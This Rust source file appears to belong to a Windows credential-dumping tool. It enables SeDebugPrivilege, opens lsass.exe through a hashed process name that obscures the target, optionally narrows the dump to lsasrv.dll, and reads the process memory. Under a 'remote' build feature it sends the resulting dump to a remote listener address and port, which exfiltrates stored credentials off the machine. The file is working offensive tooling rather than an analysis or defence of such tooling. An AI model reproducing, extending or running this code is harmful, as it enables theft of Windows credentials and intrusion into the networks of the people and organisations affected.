use alloc::vec::Vec;
use core::ffi::c_void;

use crate::{
    dump::dump_memory_regions,
    mdfile::{MemoryRegion, ModuleInfo},
    ntapi::{
        def::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        memory::get_modules_info,
        privilege::enable_se_debug_privilege,
        process::get_process_handle_by_name,
    },
};

#[cfg(not(feature = "remote"))]
use crate::ntapi::file::save_file;

#[cfg(feature = "remote")]
use crate::remote::winsock::send_file;

/// Enables SeDebugPrivilege for the process.
/// This is necessary to access system processes like `lsass.exe`.
pub fn initialize_privileges() -> i32 {
    unsafe { enable_se_debug_privilege() }
}

/// Retrieves a handle to the `lsass.exe` process using its DBJ2 hash.
/// Returns a handle to the process if successful.
pub fn get_process_handle() -> *mut c_void {
    unsafe { get_process_handle_by_name(0x7384117b, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ) }
}

/// Retrieves the list of modules loaded in the process.
/// If the `lsasrv` feature is enabled, it only retrieves the `lsasrv.dll` module.
pub fn retrieve_modules(process_handle: *mut c_void) -> Vec<ModuleInfo> {
    #[cfg(feature = "lsasrv")]
    return get_modules_info(process_handle, Some(0xe477fbca));
    #[cfg(not(feature = "lsasrv"))]
    return get_modules_info(process_handle, None);
}

/// Dumps the memory regions of the specified process.
/// It stores the dumped regions in `memory64list` and the raw memory data in `memory_regions`.
pub fn perform_memory_dump(
    process_handle: *mut c_void,
    module_info_list: &mut Vec<ModuleInfo>,
) -> (Vec<MemoryRegion>, Vec<u8>) {
    let mut memory64list: Vec<MemoryRegion> = Vec::new();
    let mut memory_regions: Vec<u8> = Vec::new();

    // Unsafe call to dump memory regions of the process.
    unsafe {
        dump_memory_regions(
            process_handle,
            module_info_list,
            &mut memory64list,
            &mut memory_regions,
        );
    }

    (memory64list, memory_regions)
}

/// Sends the dump file to a remote host via a network connection.
/// Used when the `remote` feature is enabled.
#[cfg(feature = "remote")]
pub fn handle_output_file(file_bytes_to_use: Vec<u8>, listener_addr: &str, listener_port: u16) {
    send_file(file_bytes_to_use.clone(), listener_addr, listener_port);
}

/// Saves the dump file locally to disk.
/// Used when the `remote` feature is not enabled.
#[cfg(not(feature = "remote"))]
pub fn handle_output_file(file_bytes_to_use: Vec<u8>, output_file_name: &str) {
    save_file(file_bytes_to_use, output_file_name);
}
